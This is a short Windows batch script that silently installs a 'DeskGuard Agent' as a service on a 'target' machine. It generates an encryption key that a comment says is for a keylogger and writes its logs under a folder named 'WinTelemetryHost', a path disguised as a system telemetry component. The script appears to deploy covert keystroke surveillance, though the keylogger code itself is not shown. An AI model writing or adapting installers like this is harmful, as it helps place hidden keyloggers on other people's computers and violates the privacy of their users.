@echo off
REM ─────────────────────────────────────────────────────────────────────────────
REM DeskGuard — Silent Install Script
REM Run as Administrator on the target Windows machine.
REM ─────────────────────────────────────────────────────────────────────────────

echo [*] Installing DeskGuard Agent...

REM Install Python dependencies silently
pip install -r agent\requirements.txt --quiet --no-warn-script-location

REM Post-install pywin32 setup (required once)
python -c "import win32serviceutil" 2>nul || python Scripts\pywin32_postinstall.py -install

REM Generate Fernet encryption key for keylogger (run once, store the output)
echo [*] Generating encryption key...
python -c "from cryptography.fernet import Fernet; print('FERNET KEY:', Fernet.generate_key().decode())"

REM Install and start the service
echo [*] Installing Windows service...
cd agent
python installer.py install

echo.
echo [✓] Agent installed and running as Windows service.
echo [✓] Logs: %PROGRAMDATA%\WinTelemetryHost\svc.log
echo.
pause
